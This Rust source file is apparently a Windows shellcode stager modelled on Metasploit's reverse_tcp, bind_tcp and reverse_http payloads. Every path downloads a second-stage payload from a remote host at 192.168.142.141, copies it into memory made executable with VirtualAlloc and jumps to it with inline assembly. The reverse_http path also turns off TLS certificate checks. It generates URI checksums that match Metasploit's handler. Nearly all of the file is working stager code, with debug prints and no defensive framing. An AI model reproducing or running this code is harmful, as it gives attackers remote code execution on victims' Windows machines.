#![feature(asm)]
#![feature(pattern)]
use bindings::windows::win32::system_services::VirtualAlloc;
use byteorder::{BigEndian, ReadBytesExt};
use std::io::Cursor;
use std::os::windows::prelude::*;
use std::{error::Error, u32};
use tokio::io::AsyncReadExt;
use tokio::net::{TcpListener, TcpStream};
async fn reverse_tcp(address: &str) -> Result<(), Box<dyn Error>> {
    let mut stream = TcpStream::connect(address).await?;
    let mut stage2_len_buf = [0u8; 4];
    stream.read_exact(&mut stage2_len_buf).await?;
    dbg!(stage2_len_buf);
    let stage2_len = u32::from_le_bytes(stage2_len_buf);
    dbg!(stage2_len);

    let mut stage2_buf = vec![0u8; stage2_len as usize];
    stream.read_exact(&mut stage2_buf).await?;

    println!("got stage2 len: {}", stage2_buf.len());

    // execute shellcode
    println!("before do shellcode");
    do_shellcode(stage2_buf, None);
    println!("after do shellcode");
    Ok(())
}

async fn handle_tcp(stream: &mut TcpStream) -> Result<(), Box<dyn Error>> {
    let mut stage2_len_buf = [0u8; 4];
    stream.read_exact(&mut stage2_len_buf).await?;
    dbg!(stage2_len_buf);
    let stage2_len = u32::from_le_bytes(stage2_len_buf);
    dbg!(stage2_len);

    let mut stage2_buf = vec![0u8; stage2_len as usize];
    stream.read_exact(&mut stage2_buf).await?;

    println!("got stage2 len: {}", stage2_buf.len());
    // lib\msf\core\payload\windows\x64\bind_tcp_x64.rb
    // save socket to rsi, stage 2 code need it.
    let raw_socket = stream.as_raw_socket();
    println!("before do shellcode");
    do_shellcode(stage2_buf, Some(raw_socket));
    println!("after do shellcode");
    Ok(())
}

async fn bind_tcp(addr: &str) -> Result<(), Box<dyn Error>> {
    let listener = TcpListener::bind(addr).await?;
    loop {
        println!("listening.......");
        let (mut stream, _) = listener.accept().await?;

        println!("got connection....");
        tokio::spawn(async move {
            // tracing::debug!("accepted connection");
            if let Err(e) = handle_tcp(&mut stream).await {
                println!("err: {:?}", e);
            }
            // if let Err(e) = process(state, stream, addr).await {
            //     // tracing::info!("an error occurred; error = {:?}", e);
            // }
        });
    }
    Ok(())
}

fn gen_rand_str(length: u32, charset: &str) -> String {
    use rand::{distributions::Alphanumeric, Rng}; // 0.8
    let s: String = rand::thread_rng()
        // .sample_iter(&charset.as_bytes().into_iter())
        .sample_iter(&Alphanumeric)
        .take(length as _)
        .map(char::from)
        .collect();
    s
}

fn gen_uri_checksum(length: u32) -> String {
    let charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-";
    loop {
        let mut checksum = 0u32;
        let mut uri_str = "".to_string();
        uri_str = gen_rand_str(length, charset);
        for value in uri_str.as_bytes() {
            checksum += *value as u32;
        }
        if checksum % 0x100 == 92 {
            return uri_str;
        }
    }
}
use std::time::Duration;
// GET /BE-mOx_33owBzADOYdIneQQKsFrLVyLmiEfQbEaPs1N1fm8p5UCxoI2fblNIw89ErU9br1bHL3KOyzfvEjZo792JrTaeFgu1zrPyenLV0I9wnYcsSclH4bsJ5q-3TsxEgdCcJGbgQHAi8X5V-k_j--jJbGXfqTDS3OlGa1h67HaYU92_QeM6-OlI7GQX8 HTTP/1.1
// curl http://192.168.142.141:4444/BE-mOx_33owBzADOYdIneQQKsFrLVyLmiEfQbEaPs1N1fm8p5UCxoI2fblNIw89ErU9br1bHL3KOyzfvEjZo792JrTaeFgu1zrPyenLV0I9wnYcsSclH4bsJ5q-3TsxEgdCcJGbgQHAi8X5V-k_j--jJbGXfqTDS3OlGa1h67HaYU92_QeM6-OlI7GQX8
async fn reverse_http(url: &str) -> Result<(), Box<dyn Error>> {
    //  # Choose a random URI length between 30 and 255 bytes
    // lib\msf\core\payload\windows\x64\reverse_http_x64.rb#L109
    let checksum = gen_uri_checksum(30);
    let url = format!("{}/{}", url, checksum);
    dbg!(&url);
    let five_seconds = Duration::new(5, 0);
    let client = reqwest::ClientBuilder::new()
        .timeout(five_seconds)
        .danger_accept_invalid_certs(true)
        .build()?;
    // client;

    // .danger_disable_hostname_verification().build().unwrap();
    let body = client.get(&url).send().await?.bytes().await?;
    let stage2_buf = body;

    println!("reverse_http, got stage2 len: {}", stage2_buf.len());
    println!("before do shellcode");
    do_shellcode(stage2_buf.to_vec(), None);
    println!("after do shellcode");
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    // reverse_tcp("192.168.142.141:4444").await?;
    // reverse_http("http://192.168.142.141:4444").await?;
    reverse_http("https://192.168.142.141:4446").await?;
    return Ok(());
}

fn do_shellcode(shellcode: Vec<u8>, socket: Option<RawSocket>) {
    let contents = shellcode;
    let flen = contents.len();

    let new_buf = unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            flen,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if new_buf == std::ptr::null_mut() {
        println!("[*] Failed to allocate memory");
        return;
    }
    let new_buf_ptr: *mut u8 = new_buf as *mut u8 as _;
    unsafe { std::ptr::copy_nonoverlapping(contents.as_ptr(), new_buf_ptr, flen) };
    let offset = 0;
    println!("[*] Starting jmp to shellcode at offset 0x{:x}", offset);
    unsafe {
        let jmp_target = new_buf.offset(offset as isize);
        // if set_breakpoint {
        //     asm!("int 3");
        // }
        if socket.is_some() {
            asm!("mov rdi, {}", in(reg) socket.unwrap());
        }
        asm!("jmp {}",in(reg) jmp_target)
    };
}
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
pub const MEM_COMMIT: u32 = 0x1000;
pub const MEM_RESERVE: u32 = 0x2000;
